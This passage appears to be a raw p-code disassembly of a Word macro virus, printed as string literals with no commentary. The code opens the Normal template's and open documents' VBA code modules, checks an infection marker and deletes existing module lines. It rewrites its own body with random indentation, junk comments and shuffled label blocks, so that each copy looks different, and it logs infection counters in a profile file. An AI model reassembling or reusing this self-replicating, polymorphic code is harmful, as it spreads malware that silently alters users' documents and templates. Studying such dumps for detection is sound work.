' 	ArgsSt Modul4 0x0001 
' Line #264:
' 	LitStr 0x0014 "If LS2m39 <> "" Then"
' 	LitDI2 0x0008 
' 	ArgsSt Modul4 0x0001 
' Line #265:
' 	LitStr 0x0053 "AM4if6 = InStr(&O1, LS2m39, Chr(&O57)): SwMgP44(&O0) = Mid(LS2m39, 1, AM4if6 - &O1)"
' 	LitDI2 0x0009 
' 	ArgsSt Modul4 0x0001 
' Line #266:
' 	LitStr 0x0075 "PdwD8a = AM4if6 + &O1: AM4if6 = InStr(PdwD8a, LS2m39, Chr(&O57)): SwMgP44(&O1) = Mid(LS2m39, PdwD8a, AM4if6 - PdwD8a)"
' 	LitDI2 0x000A 
' 	ArgsSt Modul4 0x0001 
' Line #267:
' 	LitStr 0x0028 "SwMgP44(&O2) = Mid(LS2m39, AM4if6 + &O1)"
' 	LitDI2 0x000B 
' 	ArgsSt Modul4 0x0001 
' Line #268:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x000C 
' 	ArgsSt Modul4 0x0001 
' Line #269:
' 	LitStr 0x0000 ""
' 	LitDI2 0x000D 
' 	ArgsSt Modul4 0x0001 
' Line #270:
' 	LitStr 0x000C "GoTo L8n9WKR"
' 	LitDI2 0x000E 
' 	ArgsSt Modul4 0x0001 
' Line #271:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x000F 
' 	ArgsSt Modul4 0x0001 
' Line #272:
' 	LitStr 0x0008 "L8n9WKR:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul5 0x0001 
' Line #273:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0001 
' 	ArgsSt Modul5 0x0001 
' Line #274:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0003 "œç�"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x002C ": GoSub VXdgkhe6: TQ29OG = MF0wi & Chr(&O40)"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt Modul5 0x0001 
' Line #275:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0005 "Œý�í¤"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x002C ": GoSub VXdgkhe6: KFSlBy = MF0wi & Chr(&O40)"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt Modul5 0x0001 
' Line #276:
' 	LitStr 0x005D "Set U4l6O6NO = NormalTemplate: Set BNH7J = U4l6O6NO.VBProject.VBComponents.Item(1).CodeModule"
' 	LitDI2 0x0004 
' 	ArgsSt Modul5 0x0001 
' Line #277:
' 	LitStr 0x002A "Set CVS3lq = U4l6O6NO: Set PcDCm9n = BNH7J"
' 	LitDI2 0x0005 
' 	ArgsSt Modul5 0x0001 
' Line #278:
' 	LitStr 0x000A "With BNH7J"
' 	LitDI2 0x0006 
' 	ArgsSt Modul5 0x0001 
' Line #279:
' 	LitStr 0x004B "If Not .Find(Fp5Gc6n, &O1, &O1, .CountOfLines, 1, False, False, False) Then"
' 	LitDI2 0x0007 
' 	ArgsSt Modul5 0x0001 
' Line #280:
' 	LitStr 0x0021 "For AM4if6 = 1 To Documents.Count"
' 	LitDI2 0x0008 
' 	ArgsSt Modul5 0x0001 
' Line #281:
' 	LitStr 0x0065 "Set U4l6O6NO = Documents.Item(AM4if6): Set BNH7J = U4l6O6NO.VBProject.VBComponents.Item(1).CodeModule"
' 	LitDI2 0x0009 
' 	ArgsSt Modul5 0x0001 
' Line #282:
' 	LitStr 0x0055 "If .Find(Fp5Gc6n, &O1, &O1, BNH7J.CountOfLines, 1, False, False, False) Then Exit For"
' 	LitDI2 0x000A 
' 	ArgsSt Modul5 0x0001 
' Line #283:
' 	LitStr 0x000B "Next AM4if6"
' 	LitDI2 0x000B 
' 	ArgsSt Modul5 0x0001 
' Line #284:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x000C 
' 	ArgsSt Modul5 0x0001 
' Line #285:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x000D 
' 	ArgsSt Modul5 0x0001 
' Line #286:
' 	LitStr 0x002B "If Documents.Count = &O0 Then Documents.Add"
' 	LitDI2 0x000E 
' 	ArgsSt Modul5 0x0001 
' Line #287:
' 	LitStr 0x0023 "For AM4if6 = &O0 To Documents.Count"
' 	LitDI2 0x000F 
' 	ArgsSt Modul5 0x0001 
' Line #288:
' 	LitStr 0x0014 "If AM4if6 > &O0 Then"
' 	LitDI2 0x0010 
' 	ArgsSt Modul5 0x0001 
' Line #289:
' 	LitStr 0x0023 "Set CVS3lq = Documents.Item(AM4if6)"
' 	LitDI2 0x0011 
' 	ArgsSt Modul5 0x0001 
' Line #290:
' 	LitStr 0x0040 "Set PcDCm9n = CVS3lq.VBProject.VBComponents.Item(&O1).CodeModule"
' 	LitDI2 0x0012 
' 	ArgsSt Modul5 0x0001 
' Line #291:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0013 
' 	ArgsSt Modul5 0x0001 
' Line #292:
' 	LitStr 0x001A "If CVS3lq <> U4l6O6NO Then"
' 	LitDI2 0x0014 
' 	ArgsSt Modul5 0x0001 
' Line #293:
' 	LitStr 0x000C "With PcDCm9n"
' 	LitDI2 0x0015 
' 	ArgsSt Modul5 0x0001 
' Line #294:
' 	LitStr 0x001A "Uo5hL7 = &O0: M16G5E = &O0"
' 	LitDI2 0x0016 
' 	ArgsSt Modul5 0x0001 
' Line #295:
' 	LitStr 0x0049 "If .Find(TQ29OG, M16G5E, &O1, .CountOfLines, 1, False, False, False) Then"
' 	LitDI2 0x0017 
' 	ArgsSt Modul5 0x0001 
' Line #296:
' 	LitStr 0x0049 "If .Find(KFSlBy, M16G5E, &O1, .CountOfLines, 1, False, False, False) Then"
' 	LitDI2 0x0018 
' 	ArgsSt Modul5 0x0001 
' Line #297:
' 	LitStr 0x0050 "GL3N32Ng = Mid(.Lines(M16G5E, &O1), InStr(.Lines(M16G5E, &O1), Chr(&O42)) + &O1)"
' 	LitDI2 0x0019 
' 	ArgsSt Modul5 0x0001 
' Line #298:
' 	LitStr 0x0026 "If InStr(GL3N32Ng, Chr(&O42)) > 0 Then"
' 	LitDI2 0x001A 
' 	ArgsSt Modul5 0x0001 
' Line #299:
' 	LitStr 0x0035 "GL3N32Ng = Left(GL3N32Ng, InStr(GL3N32Ng, Chr(&O42)))"
' 	LitDI2 0x001B 
' 	ArgsSt Modul5 0x0001 
' Line #300:
' 	LitStr 0x006E "For PdwD8a = &O1 To Len(GL3N32Ng) - &O1: Uo5hL7 = vbCr & Uo5hL7 + Asc(Mid(GL3N32Ng, PdwD8a, &O1)): Next PdwD8a"
' 	LitDI2 0x001C 
' 	ArgsSt Modul5 0x0001 
' Line #301:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x001D 
' 	ArgsSt Modul5 0x0001 
' Line #302:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x001E 
' 	ArgsSt Modul5 0x0001 
' Line #303:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x001F 
' 	ArgsSt Modul5 0x0001 
' Line #304:
' 	LitStr 0x0022 "If Uo5hL7 <> &O43326 Then Exit For"
' 	LitDI2 0x0020 
' 	ArgsSt Modul5 0x0001 
' Line #305:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x0021 
' 	ArgsSt Modul5 0x0001 
' Line #306:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0022 
' 	ArgsSt Modul5 0x0001 
' Line #307:
' 	LitStr 0x000B "Next AM4if6"
' 	LitDI2 0x0023 
' 	ArgsSt Modul5 0x0001 
' Line #308:
' 	LitStr 0x0018 "If Uo5hL7 = &O43326 Then"
' 	LitDI2 0x0024 
' 	ArgsSt Modul5 0x0001 
' Line #309:
' 	LitStr 0x0031 "If SwMgP44(&O0) < &O2 And SwMgP44(&O0) > &O0 Then"
' 	LitDI2 0x0025 
' 	ArgsSt Modul5 0x0001 
' Line #310:
' 	LitStr 0x004A "With PcDCm9n: Do While .CountOfLines > &O0: .DeleteLines 1: Loop: End With"
' 	LitDI2 0x0026 
' 	ArgsSt Modul5 0x0001 
' Line #311:
' 	LitStr 0x0012 "Else: GoTo DcJ7WD5"
' 	LitDI2 0x0027 
' 	ArgsSt Modul5 0x0001 
' Line #312:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0028 
' 	ArgsSt Modul5 0x0001 
' Line #313:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0029 
' 	ArgsSt Modul5 0x0001 
' Line #314:
' 	LitStr 0x000B "GoTo OC9esi"
' 	LitDI2 0x002A 
' 	ArgsSt Modul5 0x0001 
' Line #315:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x002B 
' 	ArgsSt Modul5 0x0001 
' Line #316:
' 	LitStr 0x0007 "OC9esi:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul6 0x0001 
' Line #317:
' 	LitStr 0x0012 "GflIa73P = Fp5Gc6n"
' 	LitDI2 0x0001 
' 	ArgsSt Modul6 0x0001 
' Line #318:
' 	LitStr 0x0021 "For AM4if6 = &O1 To Len(GflIa73P)"
' 	LitDI2 0x0002 
' 	ArgsSt Modul6 0x0001 
' Line #319:
' 	LitStr 0x0054 "PdwD8a = Int(Rnd * (Len(GflIa73P) - &O1)) + &O1: LS2m39 = Mid(GflIa73P, PdwD8a, &O1)"
' 	LitDI2 0x0003 
' 	ArgsSt Modul6 0x0001 
' Line #320:
' 	LitStr 0x005C "Mid(GflIa73P, PdwD8a, &O1) = Mid(GflIa73P, AM4if6, &O1): Mid(GflIa73P, AM4if6, &O1) = LS2m39"
' 	LitDI2 0x0004 
' 	ArgsSt Modul6 0x0001 
' Line #321:
' 	LitStr 0x000B "Next AM4if6"
' 	LitDI2 0x0005 
' 	ArgsSt Modul6 0x0001 
' Line #322:
' 	LitStr 0x000A "GoTo XDP63"
' 	LitDI2 0x0006 
' 	ArgsSt Modul6 0x0001 
' Line #323:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0007 
' 	ArgsSt Modul6 0x0001 
' Line #324:
' 	LitStr 0x0006 "XDP63:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul7 0x0001 
' Line #325:
' 	LitStr 0x001B "ReDim W4XM5(&O26) As String"
' 	LitDI2 0x0001 
' 	ArgsSt Modul7 0x0001 
' Line #326:
' 	LitStr 0x000A "With BNH7J"
' 	LitDI2 0x0002 
' 	ArgsSt Modul7 0x0001 
' Line #327:
' 	LitStr 0x001C "M16G5E = &O0: JXVd3djG = &O0"
' 	LitDI2 0x0003 
' 	ArgsSt Modul7 0x0001 
' Line #328:
' 	LitStr 0x0006 ".Find "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0006 "SHRm7m"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0059 " & Chr(&O72), M16G5E, &O0, &O0, &O0, True, True, False: If M16G5E = &O0 Then GoTo DcJ7WD5"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt Modul7 0x0001 
' Line #329:
' 	LitStr 0x0006 ".Find "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "MStoLEX"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x005D " & Chr(&O72), JXVd3djG, &O0, &O0, &O0, True, True, False: If JXVd3djG = &O0 Then GoTo DcJ7WD5"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt Modul7 0x0001 
' Line #330:
' 	LitStr 0x001F "For AM4if6 = M16G5E To JXVd3djG"
' 	LitDI2 0x0006 
' 	ArgsSt Modul7 0x0001 
' Line #331:
' 	LitStr 0x0022 "LS2m39 = Trim(.Lines(AM4if6, &O1))"
' 	LitDI2 0x0007 
' 	ArgsSt Modul7 0x0001 
' Line #332:
' 	LitStr 0x007C "If LS2m39 <> "" And Left(LS2m39, &O1) <> Chr(&O47) Then T0G9Jb = T0G9Jb & String(Int(Rnd * &O12), Chr(&O40)) & LS2m39 & vbCr"
' 	LitDI2 0x0008 
' 	ArgsSt Modul7 0x0001 
' Line #333:
' 	LitStr 0x003A "If Int(Rnd * &O12) + &O1 = &O1 Then T0G9Jb = T0G9Jb & vbCr"
' 	LitDI2 0x0009 
' 	ArgsSt Modul7 0x0001 
' Line #334:
' 	LitStr 0x0024 "If Int(Rnd * &O11) + &O1 > &O10 Then"
' 	LitDI2 0x000A 
' 	ArgsSt Modul7 0x0001 
' Line #335:
' 	LitStr 0x000B "LS2m39 = """
' 	LitDI2 0x000B 
' 	ArgsSt Modul7 0x0001 
' Line #336:
' 	LitStr 0x0067 "For PdwD8a = &O0 To Int(Rnd * &O11) + &O1: LS2m39 = LS2m39 & Rnd * (Rnd * &O23420) & vbTab: Next PdwD8a"
' 	LitDI2 0x000C 
' 	ArgsSt Modul7 0x0001 
' Line #337:
' 	LitStr 0x0050 "T0G9Jb = T0G9Jb & String(Int(Rnd * &O12), Chr(&O40)) & Chr(&O47) & LS2m39 & vbCr"
' 	LitDI2 0x000D 
' 	ArgsSt Modul7 0x0001 
' Line #338:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x000E 
' 	ArgsSt Modul7 0x0001 
' Line #339:
' 	LitStr 0x000B "Next AM4if6"
' 	LitDI2 0x000F 
' 	ArgsSt Modul7 0x0001 
' Line #340:
' 	LitStr 0x0008 "End With"
' 	LitDI2 0x0010 
' 	ArgsSt Modul7 0x0001 
' Line #341:
' 	LitStr 0x000D "GoTo TxGb0ns9"
' 	LitDI2 0x0011 
' 	ArgsSt Modul7 0x0001 
' Line #342:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0012 
' 	ArgsSt Modul7 0x0001 
' Line #343:
' 	LitStr 0x0009 "TxGb0ns9:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul8 0x0001 
' Line #344:
' 	LitStr 0x000F "An75uj = Array("
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "Yny7e7C"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "S02217RK"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0006 "J54Jq0"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0006 "E7swNF"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "L8n9WKR"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0006 "OC9esi"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0005 "XDP63"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "TxGb0ns9"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "RIud9DoA"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0006 "O0hy73"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "E7KiNw0R"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0006 "M6K4f0"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "VK8fm7H2"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0005 "G8b3E"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "S7M988u"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0005 "O192b"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0006 "E1QdMs"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "Xg645Ye"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "VXdgkhe6"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "NwR7Xamt"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0005 "R0Lsd"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "Iml96v3i"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0008 "VvhD15Ok"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "MStoLEX"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt Modul8 0x0001 
' Line #345:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0004 "ˆý»ñ"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x003A ": GoSub VXdgkhe6: MF0wi = MF0wi & Chr(&O40) & An75uj(&O27)"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt Modul8 0x0001 
' Line #346:
' 	LitStr 0x0018 "For AM4if6 = &O0 To &O26"
' 	LitDI2 0x0003 
' 	ArgsSt Modul8 0x0001 
' Line #347:
' 	LitStr 0x003C "M16G5E = InStr(1, T0G9Jb, An75uj(AM4if6) & Chr(&O72) & vbCr)"
' 	LitDI2 0x0004 
' 	ArgsSt Modul8 0x0001 
' Line #348:
' 	LitStr 0x0063 "If M16G5E > 0 Then JXVd3djG = InStr(M16G5E, T0G9Jb, MF0wi) + Len(MF0wi) - M16G5E Else: GoTo DcJ7WD5"
' 	LitDI2 0x0005 
' 	ArgsSt Modul8 0x0001 
' Line #349:
' 	LitStr 0x0049 "If JXVd3djG > 0 Then W4XM5(AM4if6) = Mid(T0G9Jb, M16G5E, JXVd3djG) & vbCr"
' 	LitDI2 0x0006 
' 	ArgsSt Modul8 0x0001 
' Line #350:
' 	LitStr 0x000B "Next AM4if6"
' 	LitDI2 0x0007 
' 	ArgsSt Modul8 0x0001 
' Line #351:
' 	LitStr 0x0043 "T0G9Jb = Left(T0G9Jb, InStr(T0G9Jb, Chr(&O72))) & vbCr & W4XM5(&O0)"
' 	LitDI2 0x0008 
' 	ArgsSt Modul8 0x0001 
' Line #352:
' 	LitStr 0x003F "MF0wi = W4XM5(&O1): W4XM5(&O1) = W4XM5(&O2): W4XM5(&O2) = MF0wi"
' 	LitDI2 0x0009 
' 	ArgsSt Modul8 0x0001 
' Line #353:
' 	LitStr 0x0018 "For AM4if6 = &O3 To &O26"
' 	LitDI2 0x000A 
' 	ArgsSt Modul8 0x0001 
' Line #354:
' 	LitStr 0x006B "PdwD8a = Int(Rnd * &O23) + &O3: MF0wi = W4XM5(AM4if6): W4XM5(AM4if6) = W4XM5(PdwD8a): W4XM5(PdwD8a) = MF0wi"
' 	LitDI2 0x000B 
' 	ArgsSt Modul8 0x0001 
' Line #355:
' 	LitStr 0x000B "Next AM4if6"
' 	LitDI2 0x000C 
' 	ArgsSt Modul8 0x0001 
' Line #356:
' 	LitStr 0x0046 "For AM4if6 = &O1 To &O26: T0G9Jb = T0G9Jb & W4XM5(AM4if6): Next AM4if6"
' 	LitDI2 0x000D 
' 	ArgsSt Modul8 0x0001 
' Line #357:
' 	LitStr 0x0019 "T0G9Jb = T0G9Jb & vbCr & "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0007 "DcJ7WD5"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0035 " & Chr(&O72) & vbCr & An75uj(&O27) & Chr(&O72) & vbCr"
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsSt Modul8 0x0001 
' Line #358:
' 	LitStr 0x000D "GoTo RIud9DoA"
' 	LitDI2 0x000F 
' 	ArgsSt Modul8 0x0001 
' Line #359:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0010 
' 	ArgsSt Modul8 0x0001 
' Line #360:
' 	LitStr 0x0009 "RIud9DoA:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul9 0x0001 
' Line #361:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0005 "Œý�í¤"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0010 ": GoSub VXdgkhe6"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt Modul9 0x0001 
' Line #362:
' 	LitStr 0x0028 "M16G5E = InStr(&O1, T0G9Jb, MF0wi) + &O5"
' 	LitDI2 0x0002 
' 	ArgsSt Modul9 0x0001 
' Line #363:
' 	LitStr 0x0051 "If M16G5E > 0 Then JXVd3djG = InStr(M16G5E, T0G9Jb, Chr(&O75)) Else: GoTo DcJ7WD5"
' 	LitDI2 0x0003 
' 	ArgsSt Modul9 0x0001 
' Line #364:
' 	LitStr 0x0054 "X01TEQM = Trim(Mid(T0G9Jb, M16G5E + &O1, (JXVd3djG - M16G5E) - &O1)): GoSub Iml96v3i"
' 	LitDI2 0x0004 
' 	ArgsSt Modul9 0x0001 
' Line #365:
' 	LitStr 0x002F "M16G5E = InStr(M16G5E, T0G9Jb, Chr(&O75)) + &O3"
' 	LitDI2 0x0005 
' 	ArgsSt Modul9 0x0001 
' Line #366:
' 	LitStr 0x005F "If M16G5E > &O0 Then JXVd3djG = Len(T0G9Jb) - (M16G5E + Len(GflIa73P) - &O1) Else: GoTo DcJ7WD5"
' 	LitDI2 0x0006 
' 	ArgsSt Modul9 0x0001 
' Line #367:
' 	LitStr 0x0044 "If M16G5E > &O0 And Mid(T0G9Jb, M16G5E, Len(Fp5Gc6n)) = Fp5Gc6n Then"
' 	LitDI2 0x0007 
' 	ArgsSt Modul9 0x0001 
' Line #368:
' 	LitStr 0x002C "Mid(T0G9Jb, M16G5E, Len(Fp5Gc6n)) = GflIa73P"
' 	LitDI2 0x0008 
' 	ArgsSt Modul9 0x0001 
' Line #369:
' 	LitStr 0x0012 "Else: GoTo DcJ7WD5"
' 	LitDI2 0x0009 
' 	ArgsSt Modul9 0x0001 
' Line #370:
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x000A 
' 	ArgsSt Modul9 0x0001 
' Line #371:
' 	LitStr 0x000B "GoTo O0hy73"
' 	LitDI2 0x000B 
' 	ArgsSt Modul9 0x0001 
' Line #372:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x000C 
' 	ArgsSt Modul9 0x0001 
' Line #373:
' 	LitStr 0x0007 "O0hy73:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul10 0x0001 
' Line #374:
' 	LitStr 0x004A "M16G5E = InStr(M16G5E + Len(Fp5Gc6n), T0G9Jb, Chr(&O47) & Chr(&O42)) + &O1"
' 	LitDI2 0x0001 
' 	ArgsSt Modul10 0x0001 
' Line #375:
' 	LitStr 0x0052 "If M16G5E > 0 Then JXVd3djG = InStr(M16G5E, T0G9Jb, vbCr) - &O1 Else: GoTo DcJ7WD5"
' 	LitDI2 0x0002 
' 	ArgsSt Modul10 0x0001 
' Line #376:
' 	LitStr 0x0044 "X01TEQM = Trim(Mid(T0G9Jb, M16G5E + &O1, (JXVd3djG - M16G5E) - &O1))"
' 	LitDI2 0x0003 
' 	ArgsSt Modul10 0x0001 
' Line #377:
' 	LitStr 0x0051 "AM4if6 = InStr(&O1, X01TEQM, Chr(&O57)): LS2m39 = Mid(X01TEQM, &O1, AM4if6 - &O1)"
' 	LitDI2 0x0004 
' 	ArgsSt Modul10 0x0001 
' Line #378:
' 	LitStr 0x0041 "PdwD8a = AM4if6 + &O1: AM4if6 = InStr(PdwD8a, X01TEQM, Chr(&O57))"
' 	LitDI2 0x0005 
' 	ArgsSt Modul10 0x0001 
' Line #379:
' 	LitStr 0x0030 "GL3N32Ng = Mid(X01TEQM, PdwD8a, AM4if6 - PdwD8a)"
' 	LitDI2 0x0006 
' 	ArgsSt Modul10 0x0001 
' Line #380:
' 	LitStr 0x0023 "TQ29OG = Mid(X01TEQM, AM4if6 + &O1)"
' 	LitDI2 0x0007 
' 	ArgsSt Modul10 0x0001 
' Line #381:
' 	LitStr 0x004E "If CVS3lq = NormalTemplate Or SwMgP44(&O0) < LS2m39 Then SwMgP44(&O0) = LS2m39"
' 	LitDI2 0x0008 
' 	ArgsSt Modul10 0x0001 
' Line #382:
' 	LitStr 0x0037 "If SwMgP44(&O1) < GL3N32Ng Then SwMgP44(&O1) = GL3N32Ng"
' 	LitDI2 0x0009 
' 	ArgsSt Modul10 0x0001 
' Line #383:
' 	LitStr 0x0033 "If SwMgP44(&O2) < TQ29OG Then SwMgP44(&O2) = TQ29OG"
' 	LitDI2 0x000A 
' 	ArgsSt Modul10 0x0001 
' Line #384:
' 	LitStr 0x0068 "If CVS3lq = NormalTemplate Then SwMgP44(&O1) = SwMgP44(&O1) + &O1 Else SwMgP44(&O2) = SwMgP44(&O2) + &O1"
' 	LitDI2 0x000B 
' 	ArgsSt Modul10 0x0001 
' Line #385:
' 	LitStr 0x0080 "System.PrivateProfileString("", YhXdXf7(&O0), YhXdXf7(&O1)) = SwMgP44(&O0) & Chr(&O57) & SwMgP44(&O1) & Chr(&O57) & SwMgP44(&O2)"
' 	LitDI2 0x000C 
' 	ArgsSt Modul10 0x0001 
' Line #386:
' 	LitStr 0x004B "LS2m39 = SwMgP44(&O0) & Chr(&O57) & SwMgP44(&O1) & Chr(&O57) & SwMgP44(&O2)"
' 	LitDI2 0x000D 
' 	ArgsSt Modul10 0x0001 
' Line #387:
' 	LitStr 0x0056 "T0G9Jb = Left(T0G9Jb, M16G5E) & LS2m39 & Right(T0G9Jb, Len(T0G9Jb) - (JXVd3djG - &O1))"
' 	LitDI2 0x000E 
' 	ArgsSt Modul10 0x0001 
' Line #388:
' 	LitStr 0x000D "GoTo E7KiNw0R"
' 	LitDI2 0x000F 
' 	ArgsSt Modul10 0x0001 
' Line #389:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0010 
' 	ArgsSt Modul10 0x0001 
' Line #390:
' 	LitStr 0x0009 "E7KiNw0R:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul11 0x0001 
' Line #391:
' 	LitStr 0x002C "JXVd3djG = InStr(M16G5E, T0G9Jb, vbCr) + &O1"
' 	LitDI2 0x0001 
' 	ArgsSt Modul11 0x0001 
' Line #392:
' 	LitStr 0x0017 "Do While JXVd3djG > &O0"
' 	LitDI2 0x0002 
' 	ArgsSt Modul11 0x0001 
' Line #393:
' 	LitStr 0x004F "M16G5E = InStr(JXVd3djG + &O3, T0G9Jb, Chr(&O75) & Chr(&O40) & Chr(&O42)) + &O3"
' 	LitDI2 0x0003 
' 	ArgsSt Modul11 0x0001 
' Line #394:
' 	LitStr 0x0054 "If M16G5E > &O3 Then JXVd3djG = InStr(M16G5E, T0G9Jb, Chr(&O42)) Else JXVd3djG = &O0"
' 	LitDI2 0x0004 
' 	ArgsSt Modul11 0x0001 
' Line #395:
' 	LitStr 0x0016 "If JXVd3djG > &O0 Then"
' 	LitDI2 0x0005 
' 	ArgsSt Modul11 0x0001 
' Line #396:
' 	LitStr 0x0034 "MF0wi = Trim(Mid(T0G9Jb, M16G5E, JXVd3djG - M16G5E))"
' 	LitDI2 0x0006 
' 	ArgsSt Modul11 0x0001 
' Line #397:
' 	LitStr 0x0022 "If MF0wi <> "" Then GoSub NwR7Xamt"
' 	LitDI2 0x0007 
' 	ArgsSt Modul11 0x0001 
